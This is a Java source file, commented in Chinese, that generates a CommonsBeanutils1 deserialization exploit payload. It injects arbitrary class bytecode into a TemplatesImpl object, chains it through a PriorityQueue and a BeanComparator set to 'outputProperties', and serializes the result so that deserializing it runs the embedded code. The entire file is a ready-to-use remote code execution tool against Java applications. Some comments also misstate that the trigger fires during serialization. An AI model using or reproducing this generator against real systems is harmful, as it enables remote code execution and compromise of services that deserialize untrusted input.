package demo;

// 导入必要的类库
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  // XSLT模板实现类，用于执行恶意代码
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  // XSLT转换工厂实现
import org.apache.commons.beanutils.BeanComparator;  // Bean比较器，用于触发反序列化链

import java.io.ByteArrayOutputStream;  // 字节数组输出流
import java.io.ObjectOutputStream;     // 对象序列化输出流
import java.lang.reflect.Field;        // 反射字段类
import java.util.PriorityQueue;        // 优先队列，用于触发比较器

/**
 * CB类 - CommonsBeanutils反序列化链生成器
 * 用于生成CommonsBeanutils1反序列化漏洞的payload
 * 该链利用PriorityQueue的序列化机制触发BeanComparator的比较方法
 */
public class CB {
    
    /**
     * 通过反射设置对象的字段值
     * 用于修改私有字段，绕过访问限制
     * 
     * @param obj 目标对象
     * @param fieldName 字段名
     * @param value 要设置的值
     * @throws Exception 反射操作异常
     */
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        // 获取指定字段的Field对象
        Field field = obj.getClass().getDeclaredField(fieldName);
        // 设置字段可访问（绕过private修饰符）
        field.setAccessible(true);
        // 设置字段值
        field.set(obj, value);
    }

    /**
     * 生成CommonsBeanutils1反序列化链的payload
     * 利用PriorityQueue + BeanComparator + TemplatesImpl构造恶意序列化数据
     * 
     * @param clazzBytes 恶意类的字节码数组
     * @return 序列化后的字节数组
     * @throws Exception 序列化或反射操作异常
     */
    public byte[] getPayload(byte[] clazzBytes) throws Exception {
        // 创建TemplatesImpl对象，用于执行恶意代码
        TemplatesImpl obj = new TemplatesImpl();
        
        // 通过反射设置TemplatesImpl的关键字段
        // _bytecodes: 存储要执行的类字节码
        setFieldValue(obj, "_bytecodes", new byte[][]{clazzBytes});
        // _name: 设置类名，触发类加载
        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        // _tfactory: 设置转换工厂，用于XSLT处理
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());

        // 创建BeanComparator比较器，初始property为null
        // String.CASE_INSENSITIVE_ORDER作为备用比较器
        final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
        
        // 创建PriorityQueue，使用BeanComparator作为比较器
        // 初始容量为2，用于存储两个元素
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        
        // 添加占位数据，稍后会被替换
        // PriorityQueue在序列化时会调用比较器进行排序
        queue.add("1");
        queue.add("1");

        // 通过反射修改BeanComparator的property字段
        // 设置为"outputProperties"，这是TemplatesImpl的一个getter方法
        // 当PriorityQueue序列化时，会调用comparator.compare()方法
        // compare()方法会调用getter方法获取属性值进行比较
        setFieldValue(comparator, "property", "outputProperties");
        
        // 通过反射替换PriorityQueue内部的队列数组
        // 将占位数据替换为TemplatesImpl对象
        // 这样在序列化时，比较器会调用TemplatesImpl.getOutputProperties()
        // 从而触发恶意类的实例化和代码执行
        setFieldValue(queue, "queue", new Object[]{obj, obj});

        // ==================
        // 生成序列化字符串
        // 将构造好的PriorityQueue对象序列化为字节数组
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(queue);  // 序列化PriorityQueue对象
        oos.close();

        // 返回序列化后的字节数组
        // 这个字节数组就是最终的payload，可以被反序列化触发漏洞
        return barr.toByteArray();
    }
}
